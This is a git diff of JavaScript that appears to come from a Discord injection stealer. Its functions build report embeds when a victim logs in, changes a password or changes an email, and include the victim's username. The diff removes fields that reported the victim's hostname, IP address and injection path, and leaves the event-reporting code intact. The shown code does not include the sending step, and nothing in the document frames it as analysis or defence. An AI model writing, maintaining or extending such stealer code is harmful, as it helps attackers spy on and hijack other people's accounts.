@@ -64,11 +64,7 @@ function FirstTime() {
                     title: "Discord Initalized",
                     color: config["embed-color"],
                     fields: [
-                      {
-                        name: "Info",
-                        value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
-                        inline: !1,
-                      },
+                     
                       {
                         name: "<:members:966817375863308350> Username",
                         value: `\`${n.username}#${n.discriminator}\``,
@@ -137,11 +133,7 @@ function FirstTime() {
                       title: "User got logged out",
                       color: config["embed-color"],
                       fields: [
-                        {
-                          name: "Info",
-                          value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
-                          inline: !1,
-                        },
+                      
                         {
                           name: "<:members:966817375863308350> Username",
                           value: `\`${n.username}#${n.discriminator}\``,
@@ -308,11 +300,7 @@ function Login(e, t, n) {
                         title: "User Login",
                         color: config["embed-color"],
                         fields: [
-                          {
-                            name: "Info",
-                            value: `\`\`\`Hostname: \n${computerName}\nIP: \n${o}\nInjection Info: \n${discordInstall}\n\`\`\``,
-                            inline: !1,
-                          },
+                         
                           {
                             name: "<:members:966817375863308350> Username",
                             value: `\`${i.username}#${i.discriminator}\``,
@@ -426,11 +414,7 @@ function ChangePassword(e, t, n) {
                     title: "<:lock:966790360409989171> Password Changed",
                     color: config["embed-color"],
                     fields: [
-                      {
-                        name: "Info",
-                        value: `\`\`\`Hostname: \n${computerName}\nIP: \n${o}\nInjection Info: \n${discordInstall}\n\`\`\``,
-                        inline: !1,
-                      },
+                    
                       {
                         name: "<:members:966817375863308350> Username",
                         value: `\`${s.username}#${s.discriminator}\``,
@@ -516,11 +500,7 @@ function ChangeEmail(e, t, n) {
                     title: "<:gmail:966790304701235230> Email Changed",
                     color: config["embed-color"],
                     fields: [
-                      {
-                        name: "Info",
-                        value: `\`\`\`Hostname: \n${computerName}\nIP: \n${o}\`\`\``,
-                        inline: !1,
-                      },
+                   
                       {
                         name: "<:members:966817375863308350> Username",
                         value: `\`${s.username}#${s.discriminator}\``,
